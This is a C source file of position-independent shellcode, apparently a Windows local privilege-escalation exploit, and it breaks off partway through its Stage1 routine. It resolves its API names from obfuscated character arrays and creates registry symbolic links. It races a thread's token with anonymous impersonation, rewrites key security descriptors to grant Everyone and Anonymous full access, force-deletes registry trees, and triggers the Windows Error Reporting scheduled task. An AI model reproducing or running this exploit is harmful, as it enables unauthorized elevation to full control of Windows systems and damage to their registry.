#include "miniplasma_sc_data.h"
#include "shellcode_common.h"

#ifndef STATUS_NO_MORE_ENTRIES
#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
#endif

typedef ULONG KEY_INFORMATION_CLASS;

typedef struct _CF_PLATFORM_INFO {
  DWORD BuildNumber;
  DWORD RevisionNumber;
  DWORD IntegrationNumber;
} CF_PLATFORM_INFO;

typedef enum _AbortHydrationFlags {
  AbortHydrationFlagsNone = 0,
  AbortHydrationFlagsUnblock = 1,
  AbortHydrationFlagsBlock = 2,
} AbortHydrationFlags;

typedef struct _KEY_BASIC_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG TitleIndex;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct _CTX {
  WCHAR rid[16];
  WCHAR pipeName[64];
  WCHAR configDir[260];
  WCHAR configFile[260];
  WCHAR payloadPath[260];
} CTX, *PCTX;

typedef struct _FP {
  HANDLE hTT;
  volatile BOOL *pD;
} FP;

typedef struct _KP {
  BOOL uRK;
  volatile BOOL *pD;
} KP;

#define RESOLVE(base, var, carray)                                             \
  do {                                                                         \
    char _fn[] = carray;                                                       \
    *(PVOID *)&var = _GetProcAddress(base, _fn);                               \
    if (!var) {                                                                \
      _fail = 1;                                                               \
      goto cleanup;                                                            \
    }                                                                          \
  } while (0)

FUNC void ExecuteTask(void) {
  MODNAME_TASKCOMP;
  PVOID hTC = GET_MODULE_TC;
  if (!hTC)
    return;
  typedef HRESULT(WINAPI * pFn)(LPCWSTR, DWORD, LPCWSTR *, DWORD, DWORD,
                                LPCWSTR, GUID *);
  pFn SchRpcRun;
  {
    char _f[] = {'S', 'c', 'h', 'R', 'p', 'c', 'R', 'u', 'n', '\0'};
    *(PVOID *)&SchRpcRun = _GetProcAddress(hTC, _f);
    if (!SchRpcRun)
      return;
  }
  WCHAR tp[] = {L'\\', L'M', L'i',  L'c', L'r', L'o', L's', L'o', L'f',  L't',
                L'\\', L'W', L'i',  L'n', L'd', L'o', L'w', L's', L'\\', L'W',
                L'i',  L'n', L'd',  L'o', L'w', L's', L' ', L'E', L'r',  L'r',
                L'o',  L'r', L' ',  L'R', L'e', L'p', L'o', L'r', L't',  L'i',
                L'n',  L'g', L'\\', L'Q', L'u', L'e', L'u', L'e', L'R',  L'e',
                L'p',  L'o', L'r',  L't', L'i', L'n', L'g', L'\0'};
  ALIGN_STACK();
  SchRpcRun(tp, 0, NULL, 0, 0, NULL, NULL);
}

FUNC NTSTATUS CreateRegistrySymbolicLink(LPCWSTR SymlinkPath,
                                         LPCWSTR TargetPath) {
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN)
    return STATUS_DLL_NOT_FOUND;
  typedef NTSTATUS(NTAPI * pNK)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG,
                                PUNICODE_STRING, ULONG, PULONG);
  typedef NTSTATUS(NTAPI * pNSV)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID,
                                 ULONG);
  pNK NtCreateKey;
  {
    char _f[] = {'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtCreateKey = _GetProcAddress(hN, _f);
    if (!NtCreateKey)
      return STATUS_ENTRYPOINT_NOT_FOUND;
  }
  pNSV NtSetValueKey;
  {
    char _f[] = {'N', 't', 'S', 'e', 't', 'V', 'a',
                 'l', 'u', 'e', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtSetValueKey = _GetProcAddress(hN, _f);
    if (!NtSetValueKey)
      return STATUS_ENTRYPOINT_NOT_FOUND;
  }
  HANDLE hKey = NULL;
  UNICODE_STRING us;
  RtlInitUnicodeString(&us, SymlinkPath);
  OBJECT_ATTRIBUTES oa;
  InitializeObjectAttributes(&oa, (PUNICODE_STRING)&us, OBJ_CASE_INSENSITIVE,
                             NULL, NULL);
  ALIGN_STACK();
  NTSTATUS st =
      NtCreateKey(&hKey, KEY_WRITE, &oa, 0, NULL, REG_OPTION_CREATE_LINK, NULL);
  if (!NT_SUCCESS(st))
    return st;
  WCHAR vn[] = {L'S', L'y', L'm', L'b', L'o', L'l', L'i', L'c', L'L',
                L'i', L'n', L'k', L'V', L'a', L'l', L'u', L'e', L'\0'};
  UNICODE_STRING uv;
  RtlInitUnicodeString(&uv, vn);
  ALIGN_STACK();
  st = NtSetValueKey(hKey, (PUNICODE_STRING)&uv, 0, REG_LINK, (PVOID)TargetPath,
                     (ULONG)(_wcslen(TargetPath) * sizeof(WCHAR)));
  {
    MODNAME_K32;
    PVOID _hk32 = GET_MODULE_K32;
    if (!_hk32) {
      return st;
    }
    typedef BOOL(WINAPI * pCH)(HANDLE);
    pCH _fnCH;
    {
      char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
      *(PVOID *)&_fnCH = _GetProcAddress(_hk32, _f);
      if (!_fnCH) {
        return st;
      }
    }
    _fnCH(hKey);
  }
  return st;
}

FUNC DWORD WINAPI Stage2Thread(LPVOID lp);

FUNC BOOL ForceKeyDeleteKey(HANDLE hRoot, PCWSTR name);

FUNC void DeleteRegistryTree(HANDLE hRoot) {
  int _fail = 0;
  (void)_fail;
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN)
    return;
  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return;
  typedef NTSTATUS(NTAPI * pNE)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID,
                                ULONG, PULONG);
  pNE NtEnumerateKey;
  {
    char _f[] = {'N', 't', 'E', 'n', 'u', 'm', 'e', 'r',
                 'a', 't', 'e', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtEnumerateKey = _GetProcAddress(hN, _f);
    if (!NtEnumerateKey)
      return;
  }
  typedef PVOID(WINAPI * pVA)(LPVOID, SIZE_T, DWORD, DWORD);
  typedef BOOL(WINAPI * pVF)(LPVOID, SIZE_T, DWORD);
  pVA _fnVA;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l',
                 'A', 'l', 'l', 'o', 'c', '\0'};
    *(PVOID *)&_fnVA = _GetProcAddress(hK, _f);
    if (!_fnVA)
      return;
  }
  pVF _fnVF;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0'};
    *(PVOID *)&_fnVF = _GetProcAddress(hK, _f);
    if (!_fnVF)
      return;
  }
  typedef BOOL(WINAPI * pCH)(HANDLE);
  pCH _fnCH;
  {
    char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnCH = _GetProcAddress(hK, _f);
    if (!_fnCH)
      return;
  }
  ULONG bufSize = sizeof(KEY_BASIC_INFORMATION) + 260 * sizeof(WCHAR);
  PKEY_BASIC_INFORMATION pKI =
      (PKEY_BASIC_INFORMATION)_fnVA(NULL, bufSize, MEM_COMMIT, PAGE_READWRITE);
  if (!pKI)
    return;
  ULONG idx = 0;
  while (1) {
    ULONG rl = 0;
    ALIGN_STACK();
    NTSTATUS st = NtEnumerateKey(hRoot, idx, 0, pKI, bufSize, &rl);
    if (st == STATUS_NO_MORE_ENTRIES)
      break;
    if (NT_SUCCESS(st)) {
      WCHAR sn[260];
      ULONG tc = pKI->NameLength / sizeof(WCHAR);
      if (tc > 260)
        tc = 260 - 1;
      _wcsncpy(sn, pKI->Name, tc);
      sn[tc] = L'\0';
      if (ForceKeyDeleteKey(hRoot, sn))
        idx = 0;
      else
        idx++;
    } else
      break;
  }
  _fnVF(pKI, 0, MEM_RELEASE);
}

FUNC HANDLE OpenKey(HANDLE hRoot, PCWSTR path, ACCESS_MASK da) {
  int _fail = 0;
  (void)_fail;
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN)
    return NULL;
  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return NULL;
  MODNAME_A32;
  PVOID hA = GET_MODULE_A32;
  if (!hA)
    return NULL;
  typedef NTSTATUS(NTAPI * pNO)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
  typedef NTSTATUS(NTAPI * pNIA)(HANDLE);
  pNO NtOpenKey;
  {
    char _f[] = {'N', 't', 'O', 'p', 'e', 'n', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtOpenKey = _GetProcAddress(hN, _f);
    if (!NtOpenKey)
      return NULL;
  }
  pNIA NtImpersonateAnonymousToken;
  {
    char _f[] = {'N', 't', 'I', 'm', 'p', 'e', 'r', 's', 'o', 'n',
                 'a', 't', 'e', 'A', 'n', 'o', 'n', 'y', 'm', 'o',
                 'u', 's', 'T', 'o', 'k', 'e', 'n', '\0'};
    *(PVOID *)&NtImpersonateAnonymousToken = _GetProcAddress(hN, _f);
    if (!NtImpersonateAnonymousToken)
      return NULL;
  }
  typedef HANDLE(WINAPI * pGCT)(void);
  pGCT _fnGCT;
  {
    char _f[] = {'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n',
                 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0'};
    *(PVOID *)&_fnGCT = _GetProcAddress(hK, _f);
    if (!_fnGCT)
      return NULL;
  }
  typedef BOOL(WINAPI * pRTS)(void);
  pRTS _fnRTS;
  {
    char _f[] = {'R', 'e', 'v', 'e', 'r', 't', 'T',
                 'o', 'S', 'e', 'l', 'f', '\0'};
    *(PVOID *)&_fnRTS = _GetProcAddress(hA, _f);
    if (!_fnRTS)
      return NULL;
  }
  UNICODE_STRING us;
  RtlInitUnicodeString(&us, path);
  OBJECT_ATTRIBUTES oa;
  InitializeObjectAttributes(&oa, (PUNICODE_STRING)&us,
                             OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, hRoot, NULL);
  HANDLE hKey = NULL;
  ALIGN_STACK();
  NTSTATUS st = NtOpenKey(&hKey, da, &oa);
  if (NT_SUCCESS(st))
    return hKey;
  ALIGN_STACK();
  st = NtImpersonateAnonymousToken(_fnGCT());
  if (NT_SUCCESS(st)) {
    ALIGN_STACK();
    st = NtOpenKey(&hKey, da, &oa);
    _fnRTS();
    if (NT_SUCCESS(st))
      return hKey;
  }
  return NULL;
}

FUNC void SetSecurityDescriptor(HANDLE key, SECURITY_INFORMATION info) {
  int _fail = 0;
  (void)_fail;
  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return;
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN)
    return;
  MODNAME_A32;
  PVOID hA = GET_MODULE_A32;
  if (!hA)
    return;
  typedef PVOID(WINAPI * pVA)(LPVOID, SIZE_T, DWORD, DWORD);
  typedef BOOL(WINAPI * pVF)(LPVOID, SIZE_T, DWORD);
  typedef DWORD(WINAPI * pGLE)(void);
  pVA _fnVA;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l',
                 'A', 'l', 'l', 'o', 'c', '\0'};
    *(PVOID *)&_fnVA = _GetProcAddress(hK, _f);
    if (!_fnVA)
      return;
  }
  pVF _fnVF;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0'};
    *(PVOID *)&_fnVF = _GetProcAddress(hK, _f);
    if (!_fnVF)
      return;
  }
  pGLE _fnGLE;
  {
    char _f[] = {'G', 'e', 't', 'L', 'a', 's', 't',
                 'E', 'r', 'r', 'o', 'r', '\0'};
    *(PVOID *)&_fnGLE = _GetProcAddress(hK, _f);
    if (!_fnGLE)
      return;
  }
  typedef BOOL(WINAPI * pCSS)(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR *, PULONG);
  pCSS ConvertStringSecurityDescriptorToSecurityDescriptorW;
  {
    char _f[] = {'C', 'o', 'n', 'v', 'e', 'r', 't', 'S', 't', 'r', 'i',
                 'n', 'g', 'S', 'e', 'c', 'u', 'r', 'i', 't', 'y', 'D',
                 'e', 's', 'c', 'r', 'i', 'p', 't', 'o', 'r', 'T', 'o',
                 'S', 'e', 'c', 'u', 'r', 'i', 't', 'y', 'D', 'e', 's',
                 'c', 'r', 'i', 'p', 't', 'o', 'r', 'W', '\0'};
    *(PVOID *)&ConvertStringSecurityDescriptorToSecurityDescriptorW =
        _GetProcAddress(hA, _f);
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW)
      return;
  }
  typedef NTSTATUS(NTAPI * pNSS)(HANDLE, SECURITY_INFORMATION,
                                 PSECURITY_DESCRIPTOR);
  pNSS NtSetSecurityObject;
  {
    char _f[] = {'N', 't', 'S', 'e', 't', 'S', 'e', 'c', 'u', 'r',
                 'i', 't', 'y', 'O', 'b', 'j', 'e', 'c', 't', '\0'};
    *(PVOID *)&NtSetSecurityObject = _GetProcAddress(hN, _f);
    if (!NtSetSecurityObject)
      return;
  }
  typedef BOOL(WINAPI * pMASD)(PSECURITY_DESCRIPTOR, PSECURITY_DESCRIPTOR,
                               PDWORD, PACL, PDWORD, PACL, PDWORD, PSID, PDWORD,
                               PSID, PDWORD);
  pMASD MakeAbsoluteSD;
  {
    char _f[] = {'M', 'a', 'k', 'e', 'A', 'b', 's', 'o',
                 'l', 'u', 't', 'e', 'S', 'D', '\0'};
    *(PVOID *)&MakeAbsoluteSD = _GetProcAddress(hA, _f);
    if (!MakeAbsoluteSD)
      return;
  }

  WCHAR sddl[] = {L'D', ':', '(', 'A', ';', 'O', 'I', 'C', 'I', 'I', 'O',
                  ';',  'G', 'A', ';', ';', ';', 'W', 'D', ')', '(', 'A',
                  ';',  'O', 'I', 'C', 'I', 'I', 'O', ';', 'G', 'A', ';',
                  ';',  ';', 'A', 'N', ')', '(', 'A', ';', ';', 'G', 'A',
                  ';',  ';', ';', 'W', 'D', ')', '(', 'A', ';', ';', 'G',
                  'A',  ';', ';', ';', 'A', 'N', ')', 'S', ':', '(', 'M',
                  'L',  ';', 'O', 'I', 'C', 'I', ';', 'N', 'W', ';', ';',
                  ';',  'S', '-', '1', '-', '1', '6', '-', '0', ')', '\0'};
  PSECURITY_DESCRIPTOR pRSD = NULL;
  ULONG sdSz = 0;
  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, 1, &pRSD,
                                                            &sdSz))
    return;
  if (!pRSD)
    return;
  DWORD aSz = 0, dSz = 0, sSz = 0, oSz = 0, pSz = 0;
  MakeAbsoluteSD(pRSD, NULL, &aSz, NULL, &dSz, NULL, &sSz, NULL, &oSz, NULL,
                 &pSz);
  PSECURITY_DESCRIPTOR pASD =
      (PSECURITY_DESCRIPTOR)_fnVA(NULL, aSz, MEM_COMMIT, PAGE_READWRITE);
  PACL pD = (PACL)_fnVA(NULL, dSz, MEM_COMMIT, PAGE_READWRITE);
  PACL pS = (PACL)_fnVA(NULL, sSz, MEM_COMMIT, PAGE_READWRITE);
  PSID pO = (PSID)_fnVA(NULL, oSz, MEM_COMMIT, PAGE_READWRITE);
  PSID pP = (PSID)_fnVA(NULL, pSz, MEM_COMMIT, PAGE_READWRITE);
  if (pASD && pD && pS && pO && pP) {
    if (MakeAbsoluteSD(pRSD, pASD, &aSz, pD, &dSz, pS, &sSz, pO, &oSz, pP,
                       &pSz)) {
      SECURITY_INFORMATION si = info & ~0x100; /* ~SACL_SECURITY_INFORMATION */
      ALIGN_STACK();
      NtSetSecurityObject(key, si, pASD);
    }
  }
  if (pASD)
    _fnVF(pASD, 0, MEM_RELEASE);
  if (pD)
    _fnVF(pD, 0, MEM_RELEASE);
  if (pS)
    _fnVF(pS, 0, MEM_RELEASE);
  if (pO)
    _fnVF(pO, 0, MEM_RELEASE);
  if (pP)
    _fnVF(pP, 0, MEM_RELEASE);
  _fnVF(pRSD, 0, MEM_RELEASE);
}

FUNC BOOL ForceKeyDeleteKey(HANDLE hRoot, PCWSTR name) {
  MODNAME_K32;
  PVOID _hk32 = GET_MODULE_K32;
  typedef BOOL(WINAPI * pCH)(HANDLE);
  pCH _fnCH;
  {
    char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnCH = _hk32 ? _GetProcAddress(_hk32, _f) : NULL;
  }
  HANDLE hD = OpenKey(hRoot, name, WRITE_DAC);
  if (hD) {
    SetSecurityDescriptor(hD, 4);
    if (_fnCH)
      _fnCH(hD);
  }
  HANDLE hO = OpenKey(hRoot, name, WRITE_OWNER);
  if (hO) {
    SetSecurityDescriptor(hO, 0x10);
    if (_fnCH)
      _fnCH(hO);
  }
  HANDLE hDel = OpenKey(hRoot, name, DELETE | KEY_ENUMERATE_SUB_KEYS);
  if (!hDel)
    return FALSE;
  DeleteRegistryTree(hDel);
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN) {
    if (_fnCH)
      _fnCH(hDel);
    return FALSE;
  }
  typedef NTSTATUS(NTAPI * pND)(HANDLE);
  pND NtDeleteKey;
  {
    char _f[] = {'N', 't', 'D', 'e', 'l', 'e', 't', 'e', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtDeleteKey = _GetProcAddress(hN, _f);
    if (!NtDeleteKey) {
      if (_fnCH)
        _fnCH(hDel);
      return FALSE;
    }
  }
  NTSTATUS st = NtDeleteKey(hDel);
  if (_fnCH)
    _fnCH(hDel);
  return NT_SUCCESS(st);
}

FUNC DWORD WINAPI ForceTokenThread(LPVOID lp) {
  FP *fp = (FP *)lp;
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN)
    return 1;
  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return 1;
  MODNAME_A32;
  PVOID hA = GET_MODULE_A32;
  if (!hA)
    return 1;
  typedef HANDLE(WINAPI * pGCT)(void);
  pGCT _fnGCT;
  {
    char _f[] = {'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n',
                 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0'};
    *(PVOID *)&_fnGCT = _GetProcAddress(hK, _f);
    if (!_fnGCT)
      return 1;
  }
  typedef NTSTATUS(NTAPI * pNSIT)(HANDLE, LONG, PVOID, ULONG);
  pNSIT NtSetInformationThread;
  {
    char _f[] = {'N', 't', 'S', 'e', 't', 'I', 'n', 'f', 'o', 'r', 'm', 'a',
                 't', 'i', 'o', 'n', 'T', 'h', 'r', 'e', 'a', 'd', '\0'};
    *(PVOID *)&NtSetInformationThread = _GetProcAddress(hN, _f);
    if (!NtSetInformationThread)
      return 1;
  }
  typedef BOOL(WINAPI * pIAT)(HANDLE);
  pIAT _fnIAT;
  {
    char _f[] = {'I', 'm', 'p', 'e', 'r', 's', 'o', 'n', 'a',
                 't', 'e', 'A', 'n', 'o', 'n', 'y', 'm', 'o',
                 'u', 's', 'T', 'o', 'k', 'e', 'n', '\0'};
    *(PVOID *)&_fnIAT = _GetProcAddress(hK, _f);
    if (!_fnIAT)
      return 1;
  }
  typedef BOOL(WINAPI * pOTT)(HANDLE, DWORD, BOOL, PHANDLE);
  pOTT _fnOTT;
  {
    char _f[] = {'O', 'p', 'e', 'n', 'T', 'h', 'r', 'e',
                 'a', 'd', 'T', 'o', 'k', 'e', 'n', '\0'};
    *(PVOID *)&_fnOTT = _GetProcAddress(hA, _f);
    if (!_fnOTT)
      return 1;
  }
  typedef BOOL(WINAPI * pRTS)(void);
  pRTS _fnRTS;
  {
    char _f[] = {'R', 'e', 'v', 'e', 'r', 't', 'T',
                 'o', 'S', 'e', 'l', 'f', '\0'};
    *(PVOID *)&_fnRTS = _GetProcAddress(hK, _f);
    if (!_fnRTS)
      return 1;
  }
  typedef BOOL(WINAPI * pCH)(HANDLE);
  pCH _fnCH;
  {
    char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnCH = _GetProcAddress(hK, _f);
    if (!_fnCH)
      return 1;
  }

  ALIGN_STACK();
  if (!_fnIAT(_fnGCT()))
    return 1;
  HANDLE hAT;
  ALIGN_STACK();
  if (!_fnOTT(_fnGCT(), TOKEN_ALL_ACCESS, TRUE, &hAT)) {
    _fnRTS();
    return 1;
  }
  _fnRTS();
  HANDLE hNT = NULL;
  while (!*fp->pD) {
    NtSetInformationThread(fp->hTT, 5, &hAT, sizeof(HANDLE));
    NtSetInformationThread(fp->hTT, 5, &hNT, sizeof(HANDLE));
  }
  _fnCH(hAT);
  return 0;
}

FUNC DWORD WINAPI CheckKeyThread(LPVOID lp) {
  KP *kp = (KP *)lp;
  MODNAME_NTDLL;
  PVOID hN = GET_MODULE_NTDLL;
  if (!hN)
    return 1;
  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return 1;
  typedef NTSTATUS(NTAPI * pNO)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
  typedef NTSTATUS(NTAPI * pNNC)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID,
                                 PIO_STATUS_BLOCK, ULONG, BOOLEAN, PVOID, ULONG,
                                 BOOLEAN);
  pNO NtOpenKey;
  {
    char _f[] = {'N', 't', 'O', 'p', 'e', 'n', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtOpenKey = _GetProcAddress(hN, _f);
    if (!NtOpenKey)
      return 1;
  }
  pNNC NtNotifyChangeKey;
  {
    char _f[] = {'N', 't', 'N', 'o', 't', 'i', 'f', 'y', 'C',
                 'h', 'a', 'n', 'g', 'e', 'K', 'e', 'y', '\0'};
    *(PVOID *)&NtNotifyChangeKey = _GetProcAddress(hN, _f);
    if (!NtNotifyChangeKey)
      return 1;
  }
  typedef HANDLE(WINAPI * pCEW)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
  pCEW _fnCEW;
  {
    char _f[] = {'C', 'r', 'e', 'a', 't', 'e', 'E',
                 'v', 'e', 'n', 't', 'W', '\0'};
    *(PVOID *)&_fnCEW = _GetProcAddress(hK, _f);
    if (!_fnCEW)
      return 1;
  }
  typedef DWORD(WINAPI * pWSO)(HANDLE, DWORD);
  pWSO _fnWSO;
  {
    char _f[] = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n',
                 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', '\0'};
    *(PVOID *)&_fnWSO = _GetProcAddress(hK, _f);
    if (!_fnWSO)
      return 1;
  }
  typedef BOOL(WINAPI * pCH)(HANDLE);
  pCH _fnCH;
  {
    char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnCH = _GetProcAddress(hK, _f);
    if (!_fnCH)
      return 1;
  }

  WCHAR rKP[] = {L'\\', L'R', L'e', L'g', L'i', L's',  L't', L'r', L'y',
                 L'\\', L'U', L's', L'e', L'r', L'\\', L'.', L'D', L'E',
                 L'F',  L'A', L'U', L'L', L'T', L'\\', L'S', L'o', L'f',
                 L't',  L'w', L'a', L'r', L'e', L'\\', L'P', L'o', L'l',
                 L'i',  L'c', L'i', L'e', L's', L'\\', L'M', L'i', L'c',
                 L'r',  L'o', L's', L'o', L'f', L't',  L'\0'};
  WCHAR rKD[] = {L'\\', L'R',  L'e', L'g', L'i', L's', L't',  L'r',
                 L'y',  L'\\', L'U', L's', L'e', L'r', L'\\', L'.',
                 L'D',  L'E',  L'F', L'A', L'U', L'L', L'T',  L'\0'};
  PCWSTR tgt = kp->uRK ? rKP : rKD;
  UNICODE_STRING uk;
  RtlInitUnicodeString(&uk, tgt);
  OBJECT_ATTRIBUTES oa;
  InitializeObjectAttributes(&oa, (PUNICODE_STRING)&uk, OBJ_CASE_INSENSITIVE,
                             NULL, NULL);
  HANDLE hKey = NULL;
  ALIGN_STACK();
  NTSTATUS st = NtOpenKey(&hKey, KEY_NOTIFY, &oa);
  if (!NT_SUCCESS(st))
    return 1;
  HANDLE hE = _fnCEW(NULL, FALSE, FALSE, NULL);
  IO_STATUS_BLOCK iosb;
  while (!*kp->pD) {
    ALIGN_STACK();
    st =
        NtNotifyChangeKey(hKey, hE, NULL, NULL, &iosb, 1, TRUE, NULL, 0, FALSE);
    if (st == 0x103) {
      _fnWSO(hE, INFINITE);
      *kp->pD = TRUE;
      break;
    } else
      break;
  }
  _fnCH(hE);
  _fnCH(hKey);
  return 0;
}

FUNC void Stage1(BOOL root_key) {
  MODNAME_K32;
  PVOID hK = GET_MODULE_K32;
  if (!hK)
    return;
  typedef PVOID(WINAPI * pVA)(LPVOID, SIZE_T, DWORD, DWORD);
  typedef BOOL(WINAPI * pVF)(LPVOID, SIZE_T, DWORD);
  typedef HANDLE(WINAPI * pCT)(LPSECURITY_ATTRIBUTES, SIZE_T,
                               LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
  typedef BOOL(WINAPI * pSTP)(HANDLE, int);
  typedef BOOL(WINAPI * pDH)(HANDLE, HANDLE, HANDLE, PHANDLE, DWORD, BOOL,
                             DWORD);
  typedef VOID(WINAPI * pSlp)(DWORD);
  typedef BOOL(WINAPI * pCH)(HANDLE);
  pVA _fnVA;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l',
                 'A', 'l', 'l', 'o', 'c', '\0'};
    *(PVOID *)&_fnVA = _GetProcAddress(hK, _f);
    if (!_fnVA)
      return;
  }
  pVF _fnVF;
  {
    char _f[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0'};
    *(PVOID *)&_fnVF = _GetProcAddress(hK, _f);
    if (!_fnVF)
      return;
  }
  pCT _fnCT;
  {
    char _f[] = {'C', 'r', 'e', 'a', 't', 'e', 'T',
                 'h', 'r', 'e', 'a', 'd', '\0'};
    *(PVOID *)&_fnCT = _GetProcAddress(hK, _f);
    if (!_fnCT)
      return;
  }
  pSTP _fnSTP;
  {
    char _f[] = {'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd',
                 'P', 'r', 'i', 'o', 'r', 'i', 't', 'y', '\0'};
    *(PVOID *)&_fnSTP = _GetProcAddress(hK, _f);
    if (!_fnSTP)
      return;
  }
  pDH _fnDH;
  {
    char _f[] = {'D', 'u', 'p', 'l', 'i', 'c', 'a', 't',
                 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnDH = _GetProcAddress(hK, _f);
    if (!_fnDH)
      return;
  }
  pSlp _fnSlp;
  {
    char _f[] = {'S', 'l', 'e', 'e', 'p', '\0'};
    *(PVOID *)&_fnSlp = _GetProcAddress(hK, _f);
    if (!_fnSlp)
      return;
  }
  pCH _fnCH;
  {
    char _f[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
    *(PVOID *)&_fnCH = _GetProcAddress(hK, _f);
    if (!_fnCH)
      return;
  }
  typedef HANDLE(WINAPI * pGCT)(void);
  typedef HANDLE(WINAPI * pGCP)(void);
  typedef DWORD(WINAPI * pGCPI)(void);
  pGCT _fnGCT;
  {
    char _f[] = {'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n',
                 't', 'T', 'h', 'r', 'e', 'a', 'd', '\0'};
    *(PVOID *)&_fnGCT = _GetProcAddress(hK, _f);
    if (!_fnGCT)
      return;
  }
  pGCP _fnGCP;
  {
    char _f[] = {'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n',
                 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0'};
    *(PVOID *)&_fnGCP = _GetProcAddress(hK, _f);
    if (!_fnGCP)
      return;
  }
  pGCPI _fnGCPI;
  {
    char _f[] = {'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't',
                 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0'};
    *(PVOID *)&_fnGCPI = _GetProcAddress(hK, _f);
    if (!_fnGCPI)
      return;
  }

  volatile BOOL *pD =
      (volatile BOOL *)_fnVA(NULL, sizeof(BOOL), MEM_COMMIT, PAGE_READWRITE);
  if (!pD)
    return;
  *pD = FALSE;

  KP *kp = (KP *)_fnVA(NULL, sizeof(KP), MEM_COMMIT, PAGE_READWRITE);
  if (!kp) {
    _fnVF((void *)pD, 0, MEM_RELEASE);
    return;
  }
  kp->uRK = root_key;
  kp->pD = pD;

  HANDLE hTCK = _fnCT(NULL, 0, CheckKeyThread, kp, 0, NULL);
  if (!hTCK) {
    _fnVF(kp, 0, MEM_RELEASE);
    _fnVF((void *)pD, 0, MEM_RELEASE);
    return;
  }
  _fnSTP(hTCK, THREAD_PRIORITY_BELOW_NORMAL);

  HANDLE hRCT = NULL;
  if (!_fnDH(_fnGCP(), _fnGCT(), _fnGCP(), &hRCT, 0, FALSE,
             DUPLICATE_SAME_ACCESS)) {
    _fnCH(hTCK);
    _fnVF(kp, 0, MEM_RELEASE);
    _fnVF((void *)pD, 0, MEM_RELEASE);
    return;
  }

  _fnSlp(1000);

  FP *fp = (FP *)_fnVA(NULL, sizeof(FP), MEM_COMMIT, PAGE_READWRITE);
  if (!fp) {
    _fnCH(hRCT);
    _fnCH(hTCK);
    _fnVF(kp, 0, MEM_RELEASE);
    _fnVF((void *)pD, 0, MEM_RELEASE);
    return;
  }
  fp->hTT = hRCT;
  fp->pD = pD;

  HANDLE hTFT = _fnCT(NULL, 0, ForceTokenThread, fp, 0, NULL);
  if (!hTFT) {
    _fnCH(hRCT);
    _fnCH(hTCK);
    _fnVF(kp, 0, MEM_RELEASE);
    _fnVF(fp, 0, MEM_RELEASE);
    _fnVF((void *)pD, 0, MEM_RELEASE);
    return;
  }
  _fnSTP(hTFT, THREAD_PRIORITY_BELOW_NORMAL);
